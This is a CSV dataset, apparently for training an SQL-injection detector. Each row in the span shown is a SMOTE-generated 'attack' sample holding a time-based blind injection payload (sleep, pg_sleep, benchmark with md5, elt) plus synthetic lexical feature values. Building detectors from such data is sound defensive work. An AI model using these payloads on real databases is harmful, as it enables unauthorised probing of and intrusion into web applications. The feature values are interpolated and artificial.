id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000423,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000038,0.5363045343009443,59.671165711198086,21.11936897937129,3.3418399751829266,15.0,10.954951834970334,25.59684489685646,8.119368979371291,0.25261793925575404,0.18167517943397954,0.4293194112159297,0.13638747009433674,0.0,0.0,2.0,0.0,0.0,1.1193689793712915,0.0,4.0,0.0,0.0,1.0,3.1193689793712918,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.1193689793712916,0.0,0.8806310206287083,0.1193689793712916,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1193689793712913
SMOTE_000424,attack,time,"1'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000154,1.1252006913440578,66.29641147084247,18.735457962203036,2.814546607615213,10.735457962203034,10.0,35.354579622030336,10.206373886609102,0.16281161509564926,0.15230507277846309,0.5315196269515585,0.15336368517432905,1.0,0.0,0.0,0.0,0.0,1.0,0.0,6.470915924406068,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.7354579622030337,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7354579622030337,0.2645420377969663,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000425,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000113,1.572931066138042,71.8656103004764,26.644268383412733,3.8104537521202886,17.932805150238202,21.644268383412737,24.644268383412737,7.644268383412735,0.24912181745003484,0.30139754248053685,0.34321057290553103,0.10627006716389728,0.0,0.0,1.2885367668254686,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,2.2885367668254686,0.0,0.0,0.6442683834127343,0.3557316165872657,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000426,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000113,0.3412254202649371,73.92289162354548,26.92289162354549,3.823842040119132,18.69156649418195,22.0,25.231325129363537,8.0,0.2528028470422251,0.2976113262276933,0.34136352628364763,0.10822230044643394,0.0771083764545124,0.0,1.8457832470909756,0.0,0.0,1.0,0.0,4.077108376454513,0.0,0.0,1.0,2.845783247090975,0.0771083764545124,0.0,0.9228916235454878,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000427,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000095,1.4433960595817563,93.09995548827605,28.0,3.6207049405829594,26.937472180172534,18.0,37.77498887206902,10.387494436034507,0.28876118015970825,0.19367356022800808,0.4060148124058954,0.11155044720638833,0.0,0.3874944360345066,2.0,0.0,0.0,2.0,0.0,5.0,0.0,1.0,0.0,4.0,0.0,0.3874944360345067,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.6125055639654933,0.3874944360345066,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000428,attack,time,"1"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000021,1.0721445663442282,73.36515183297259,24.0,3.544065521794021,17.0,19.0,28.418360333036254,8.94679149993634,0.23422014166772767,0.2617754524521662,0.3826444392136891,0.12135996666641702,0.0,1.0,0.0,0.0,0.0,1.0,0.0,4.9467914999363405,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000429,attack,time,1'+  (  select 'ymgm' where 8204  =  8204 and sleep  (  5  )  #,nearest_attack_euclidean,R000031,0.47609126093119997,62.545591408737884,27.431989260922354,3.901988813416414,22.772795704368942,10.0,21.113602147815527,8.659193556553413,0.364040227865018,0.1599526730999788,0.337826073642422,0.13818102539258112,2.7727957043689417,0.0,0.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,1.8863978521844706,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.8863978521844708,0.0,1.0,0.0,0.8863978521844709,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7727957043689413
SMOTE_000430,attack,time,1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000033,0.3416086989933065,78.0736184038154,26.652606901430772,3.4035387834417605,19.884202300476925,10.0,36.305213802861545,11.884202300476925,0.25483680043882495,0.12823387697661723,0.46467962372702665,0.15224969885753117,1.0,0.0,2.0,0.0,0.0,1.0,0.0,5.884202300476924,1.0,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.8842023004769244,0.11579769952307561,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000431,attack,time,1'   )    )     )   or sleep  (  5  )   and    (    (     (  'wuwv'  =  'wuwv,nearest_attack_euclidean,R000142,1.0106183701387066,77.37670963188931,17.869871104332045,2.6417985132476787,18.37670963188932,2.0,44.0,13.0,0.23746684453570926,0.025848581541162388,0.5686687939055728,0.1680157800175556,4.0,0.0,0.0,0.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3767096318893184,0.6232903681106816,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000432,attack,time,"select pg_sleep  (  5  )   and    (    (   ""byhx"" like ""byhx",nearest_attack_euclidean,R000117,1.1448815072566108,58.71155892835394,20.711558928353934,3.4740046465969034,26.711558928353934,1.2576882143292138,22.742311785670786,8.0,0.4541726926385836,0.021742343615575407,0.3876281369054869,0.1364568268403541,0.0,3.257688214329214,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.7423117856707868,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.7423117856707868,0.0,0.0,0.0,1.257688214329213,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.25768821432921324,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.257688214329213
SMOTE_000433,attack,time,select sleep  (  5  )   and    (    (   'keoy'  =  'keoy,nearest_attack_euclidean,R000025,0.02926949739467936,56.12380029116618,17.975239941766766,3.104891595679763,22.0,1.0,25.09904023293294,8.024760058233234,0.39205983419038176,0.01782090155410823,0.4471461492286564,0.14297311502685356,3.0,0.0,0.0,0.0,0.0,1.0,0.0,4.024760058233235,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000434,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,1.1641163106406958,65.45661158262968,16.73784637749237,2.8631633289107428,21.213539132477116,1.2621536225076273,32.932304337614426,10.048614490030513,0.3299664632751684,0.018817730010579167,0.49866095601055466,0.15255485070369781,3.262153622507628,0.0,0.0,0.0,0.0,1.0,0.0,5.7864608675228855,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7378463774923717,0.0,0.0,0.0,1.2621536225076282,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000435,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000086,0.8063084539238397,83.47198616892031,20.320034577699232,2.968702065701987,27.792020746619542,2.0,41.94397233784061,11.735993084460153,0.3331571016485472,0.02396283793004636,0.5023226293721019,0.14055743104930446,1.0,0.0,0.0,0.0,1.0,0.0,0.0,8.735993084460153,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.7359930844601532,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.735993084460153
SMOTE_000436,attack,time,"1'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   'fele'  =  'fele",nearest_attack_euclidean,R000042,1.1770753661125206,95.30341703430165,21.535611356201095,2.929115652406984,19.374639746703835,11.857554575195616,50.0,14.071222712402191,0.20291147602634785,0.12492059463214189,0.524734447612558,0.14743348172895226,3.071222712402192,0.0,0.0,0.0,0.0,2.0,0.0,8.0,0.0,0.0,1.0,2.0,0.7678056781005478,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.232194321899452,0.767805678100548,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000437,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000063,0.2988186163871195,98.84035454387966,23.840354543879656,2.888692390853262,29.840354543879656,2.0,53.0,14.0,0.30188320978107847,0.020235269281707866,0.5362346359652586,0.1416468849719551,0.9201772719398287,0.07982272806017132,0.0,0.0,1.0,0.0,0.0,11.0,0.0,0.0,0.0,1.0,0.9201772719398287,0.0798227280601713,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.07982272806017132,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.079822728060171
SMOTE_000438,attack,time,"1'  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000126,0.02408179709161602,73.94392459969771,26.990654099949616,3.699630668467967,16.0,21.0,27.962616399798467,8.981308199899233,0.21639451637615995,0.2840178027437099,0.3781406448317868,0.1214470360483434,0.990654099949617,0.0,0.0,0.0,0.0,1.0,0.0,4.990654099949617,0.0,0.0,1.0,1.0,0.9906540999496167,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000439,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000145,0.33519479364326804,57.249441176159934,23.916852941280023,3.6442648958918102,18.249441176159934,10.0,22.0,7.0,0.31863397832463075,0.17470923632701774,0.38436031991943903,0.12229646542891241,0.08314705871997696,0.9168529412800231,2.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,3.0,0.08314705871997707,0.9168529412800233,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.916852941280023,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9168529412800233
SMOTE_000440,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000016,0.010331861798400586,59.995531746772116,22.991063493544225,3.665002416005629,21.0,10.0,22.0,6.995531746772112,0.35002650658694506,0.16667928885092623,0.3666944354720377,0.11659976909009095,0.9955317467721126,0.0,2.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,3.0,0.9955317467721126,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000441,attack,time,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000020,2.5972236859337223,61.4652801481469,18.44652801481469,3.032520119378032,15.106943970370619,5.018752133332214,29.44652801481469,11.893056029629381,0.24866491854956135,0.076356007188214,0.48152892708776573,0.19345014717445896,3.44652801481469,0.0,0.0,0.0,0.0,1.4465280148146904,0.0,4.553471985185309,1.4465280148146904,0.5534719851853096,0.4465280148146904,1.4465280148146904,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5534719851853096,0.0,0.0,0.0,1.4465280148146904,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.44652801481469045,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4465280148146906
SMOTE_000442,attack,time,"1 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000087,0.1786809646733109,68.33930746860636,26.09694499103039,3.7571177284656083,16.0,21.0,24.19388998206078,7.145417486545586,0.2342296236279016,0.3074263810116209,0.35392963520266285,0.10441436015781475,0.0,0.04847249551519517,0.0,0.0,0.0,1.0,0.0,4.048472495515195,0.048472495515195224,0.0,1.0,1.0,0.0,0.048472495515195196,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000443,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000013,0.4984467749688463,66.43873938230166,24.292492921534446,3.5700211952681817,19.584985843068893,10.0,27.146246460767223,9.707507078465554,0.29452635427729806,0.15055173609507758,0.40860920138087214,0.14631270824675227,0.8537535392327765,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.8537535392327764,1.0,0.0,3.0,0.8537535392327764,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000444,attack,time,"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy",nearest_attack_euclidean,R000030,0.26845107654455774,61.856142271103465,19.215786593344795,3.2321152566850913,26.14385772889653,1.0,26.712284542206937,8.0,0.4227579247695954,0.016167703690563584,0.4317327420153324,0.12934162952450867,0.0,3.0,0.0,0.0,0.0,0.0,0.0,4.928071135551734,0.0,0.07192886444826563,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9280711355517344,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9280711355517344
SMOTE_000445,attack,time,"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""bvgg""  =  ""bvgg",nearest_attack_euclidean,R000093,1.540985754258872,78.0,17.3576458158674,2.6907649852780664,20.072937447602204,2.0,43.2847083682652,12.642354184132598,0.257345351892336,0.025641025641025647,0.5549321585675024,0.16208146389913589,0.0,4.0,0.0,0.0,0.0,0.6423541841325984,0.0,8.0,0.0,0.0,0.0,0.6423541841325986,0.0,1.0,0.0,0.0,0.0,0.6423541841325984,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6423541841325984,0.35764581586740163,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000446,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000103,0.6653168182333278,83.81787637714254,20.092741737144802,2.95532053214811,27.546370868572403,2.0,42.27150550857013,12.0,0.32871665100075065,0.023861768107532266,0.5042509722465235,0.14317060864519357,0.0,1.0,0.0,0.0,1.0,0.0,0.0,8.817876377142532,0.18212362285746728,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.8178763771425328,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.817876377142532
SMOTE_000447,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,nearest_attack_euclidean,R000059,0.9663451727868891,66.6654676626434,25.199280597586036,3.5827701567034986,21.932374130114713,10.0,27.733093532528677,7.0,0.32845370789145717,0.15017397837851681,0.4162505288650642,0.10512178486496176,0.0,0.2669064674713213,0.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,1.0,0.0,0.2669064674713212,0.0,0.7330935325286788,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000448,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000017,0.6715487183424329,59.153520961450155,23.0,3.6308741878826924,21.0,10.0,22.0,6.153520961450152,0.35502148582190585,0.16905785039138374,0.37192727086104427,0.10399339292566612,1.0,0.0,0.30704192290030385,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,1.3070419229003039,1.0,0.0,0.15352096145015193,0.8464790385498481,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000449,attack,time,"1'  )   where 8252  =  8252 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000149,1.9616547898294645,90.75350046168518,26.449299907662965,3.7521148456123243,23.79719963065186,24.304200554022213,32.20280036934814,10.449299907662965,0.26302084011407,0.26709996811566056,0.3545016396202445,0.11537755215002492,2.3478997229888945,0.0,0.0,0.0,0.0,2.0,0.0,4.550700092337035,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.5507000923370352,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.5507000923370352,0.0,0.4492999076629648,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000450,attack,time,"1   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000054,0.451859228229419,63.99458322891395,18.0,2.7787562329335262,10.16576387148566,10.0,34.663055485942635,9.165763871485659,0.15884455753725718,0.15644218258818965,0.5415129205961149,0.1432003392784382,0.0,0.0,0.0,0.0,0.0,1.0,0.0,6.165763871485659,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.1657638714856593,0.8342361285143407,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000451,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000029,1.4711570907751175,94.74946684969157,22.562633287577103,2.8685090682763303,29.12526657515421,2.0,50.74946684969158,12.87473342484579,0.3077447939251296,0.021117510952290974,0.5354147590495987,0.13572293607298075,0.0,0.437366712422895,0.0,0.0,1.0,0.0,0.0,10.437366712422897,0.0,0.0,0.0,1.0,0.0,0.437366712422895,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.43736671242289504,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.437366712422895
SMOTE_000452,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'dtzt' like 'dtzt,nearest_attack_euclidean,R000120,2.7015234740060943,82.61779703115704,27.62419967012856,3.6563117440892237,28.95539879047139,10.0,33.955398790471385,9.706999450214267,0.34887891424697254,0.12443065475053089,0.41109424162223795,0.11559618938025865,2.165599560171414,0.0,0.0,0.0,0.0,1.0,0.0,5.082799780085707,0.0,1.0,0.0,1.0,0.5413998900428536,0.0,0.0,0.45860010995714656,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.5413998900428534,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5413998900428534
SMOTE_000453,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000055,0.2738951122059722,65.89893168272484,22.918278937934105,3.4660952039290986,19.0,10.0,27.817210620658937,9.081721062065894,0.28885026275875064,0.15202645408355298,0.42122419735005273,0.13789908580764365,0.0,0.9182789379341064,2.0,0.0,0.0,1.0,0.0,4.163442124131787,0.0,1.0,0.0,3.0,0.0,0.9182789379341063,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000454,attack,time,select sleep  (  5  )   and    (    (   'keoy'  =  'keoy,nearest_attack_euclidean,R000025,0.04828165273592963,56.0,18.130211700984788,3.121667108170727,22.0,1.0,25.0,8.0,0.39285714285714285,0.017857142857142835,0.44642857142857145,0.14285714285714285,3.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
